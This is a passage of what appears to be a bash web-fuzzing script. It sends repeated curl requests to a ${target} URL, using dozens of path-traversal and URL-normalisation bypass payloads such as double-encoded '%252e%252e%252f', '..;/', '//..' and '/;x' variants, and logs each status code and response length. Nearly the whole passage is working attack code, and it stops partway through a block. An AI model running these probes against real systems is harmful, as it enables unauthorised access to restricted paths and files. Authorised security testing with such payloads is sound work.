	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e%252e%252f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%252e%%%%252e%%%%252f/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e%252e%253b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%252e%%%%252e%%%%253b/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e%252f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%252e%%%%252f/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e%253b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%252e%%%%253b/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%252e/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%252f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%2e%3b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%2e%%%%2e%%%%3b/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%2e%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%2e%%%%2f/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%3b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%2e%%%%3b/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%3b//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%2e%%%%3b//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%2e//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%3b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%3b/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..%2f..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..%%%%2f..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..%2f..%2f..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..%%%%2f..%%%%2f..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/../../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/../../../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../../..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/../../..//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/../..//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../..//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/../..//../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/../..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.././../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/.././../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../.;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/../.;/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..//../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..//../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..//../../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..//..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..//..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/../;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/../;/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..;%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;%2f..;%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..;%%%%2f..;%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;%2f..;%2f..;%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..;%%%%2f..;%%%%2f..;%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..;/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..;/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..;//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..;//../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;//..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..;//..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..;/;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/..;/;/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/.//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/.;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/.;//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}//..' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}//../../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//..;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}//..;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//./" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}//./' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//.;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}//.;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}///..' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}///../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}///..//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///..;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}///..;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}///..;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///..;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}///..;//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}//;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/;//' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;x" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/;x' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;x/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/;x/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/x/../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

